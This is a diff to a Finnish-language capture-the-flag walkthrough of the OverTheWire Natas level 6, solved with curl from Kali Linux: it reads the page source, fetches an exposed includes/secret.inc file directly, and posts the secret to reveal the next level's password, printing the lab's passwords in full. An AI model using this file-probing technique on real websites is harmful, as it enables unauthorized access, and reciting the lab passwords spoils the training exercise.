@@ -77,12 +77,170 @@ Sitten ja _voila_ , tässä on ratkaistettu level 7:n seuraava salasansa. En ois
 
 Mini yhteenvetona tässä ei tarvittu tuota Kali linux terminaali, mutta voi hyvinkin katsoa miten tätä oltaisi voittu ratkaista.
 
-## level 6 - 1
+## level 6 - 1 Kali Linux version - START HERE
 
-Tässä steppissä mennään Kali linux kautta, mutta ylemmissä mentiin suorttaan sivustojen kautta ja käyttäen pientä salapoliisityötä.
+Tässä steppissä mennään Kali linux kautta, mutta ylemmissä mentiin suorttaan sivustojen kautta ja käyttäen pientä salapoliisityötä, mutta idea on sama ja mentiin mutkan kautta. Harjoitus tekee aina mestariksi, että hyvä steppi.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org 
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+
+**tämä on tarkistus HTTP-vastaus koodia** , että tämä ensimmäisenä;
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -I -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/index-source.html
+HTTP/1.1 200 OK
+Date: Fri, 02 May 2025 07:15:48 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Last-Modified: Thu, 10 Apr 2025 14:18:42 GMT
+ETag: "b75-6326d4351c6fc"
+Accept-Ranges: bytes
+Content-Length: 2933
+Vary: Accept-Encoding
+Content-Type: text/html
+```
+
+Jotenkin oikealla jäljillä ja sekalaista html koodia näyttävänsä ja tässä on mukana PHP-koodikieltä, eli sama kuin selaimessa ja siksi toistumisessa näyttää tosi sekavalta..
+
+**OPTION2-komento** ja sama idea; `$curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/index-source.html`
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org/index-source.html
+<code><span style="color: #000000">
+&lt;html&gt;<br />&lt;head&gt;<br />&lt;!--&nbsp;This&nbsp;stuff&nbsp;in&nbsp;the&nbsp;header&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;the&nbsp;level&nbsp;--&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;type="text/css"&nbsp;href="http://natas.labs.overthewire.org/css/level.css"&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/jquery-ui.css"&nbsp;/&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/wechall.css"&nbsp;/&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;<br />&lt;script&gt;var&nbsp;wechallinfo&nbsp;=&nbsp;{&nbsp;"level":&nbsp;"natas6",&nbsp;"pass":&nbsp;"&lt;censored&gt;"&nbsp;};&lt;/script&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;natas6&lt;/h1&gt;<br />&lt;div&nbsp;id="content"&gt;<br /><br /><span style="color: #0000BB">&lt;?<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">"includes/secret.inc"</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"submit"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$secret&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">'secret'</span><span style="color: #007700">])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Access&nbsp;granted.&nbsp;The&nbsp;password&nbsp;for&nbsp;natas7&nbsp;is&nbsp;&lt;censored&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Wrong&nbsp;secret"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;<br /></span><br />&lt;form&nbsp;method=post&gt;<br />Input&nbsp;secret:&nbsp;&lt;input&nbsp;name=secret&gt;&lt;br&gt;<br />&lt;input&nbsp;type=submit&nbsp;name=submit&gt;<br />&lt;/form&gt;<br /><br />&lt;div&nbsp;id="viewsource"&gt;&lt;a&nbsp;href="index-source.html"&gt;View&nbsp;sourcecode&lt;/a&gt;&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></span>
+</code>
+```
+
+ainakin ylemmässä sekalaisessa koodikielessä ainakin pistää ilmiinsä on toi **"includes/secret.inc"** - sana. Tämä on se just mikä meitä kiinnostaa nyt, ja meidän pitää selvittää se ja mihin se voisii johtaa.
+
+Ehkä osalle tai jonkun mielestä se voi johtaa seuraavaa polkua eli **`/index-source.html/includes/secret.inc`** , mutta ei, se on yksittäinen polku, että joudutaan kumota polku `/index-source.html`.
+
+Eli ratkaisuksi menee näin (alemman komennon mukaan), ja tämä on se se salainen koodi, jonka halutaan tietää.
+
+```
+┌──(kali㉿kali)-[~] 
+└─$ curl -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/includes/secret.inc 
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+
+```
+
+Sitten tätä koodia pitää sijoittaa siihen formaatti kenttään, eli joudutaan palata siihen etusivulle. Tuossa formaatti funktiossa `<form method=post>` ja päättyvään formaattiin `</form>`, `name=secret`.
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org                  
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+```
+
+Nyt jouduttaan käyttää HTTP-protokollassa POST, PUT, DELETE ja muut vastaavat metodit ovat tapa suorittaa erilaisia toimintoja verkkosivujen ja API:iden kanssa. `curl` komentoa voi lähettää HTTP-pyyntöjä, kuten POST ja PUT, suoraan komentoriviltä, joten käytettään tätä ja testataan.
+
+HTML-lomakkeeseen curl-komennolla, koska sivu käyttää POST-metodia lomakekenttien käsittelyyn.
+
+nyt kokeillaan sijoittaa toi salainen koodi "FOEIUWGHFEEUHOFUOIU" vastaus tuohon **Input secret** kentään.
+
+**TÄMÄ ON MALLI:**
+*mitä tässä oikein tapahtuu?* 
+
+- -X POST määrittää, että käytetään HTTP POST -pyyntöä.
+- -d "secret=LoremIpsum&submit=Submit" lähettää lomaketietona secret-kenttään arvon LoremIpsum ja painaa "submit"-painiketta.
+- -H "Referer: ..." asettaa Referer-otsikon, joka voi olla tarpeellinen pääsyn varmistamiseksi.
+- -u "natas6:..." lisää käyttäjätunnuksen ja salasanan autentikaatioon.
+
+`$curl -X POST -d "secret=LoremIpsum&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/`
+
+
+
+Nyt näyttää ainakin pelittävän ja näin saattiin toi level 7:n salasansa 
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ---
+---
 
+# Level 7 - START HERE;
 
 
 
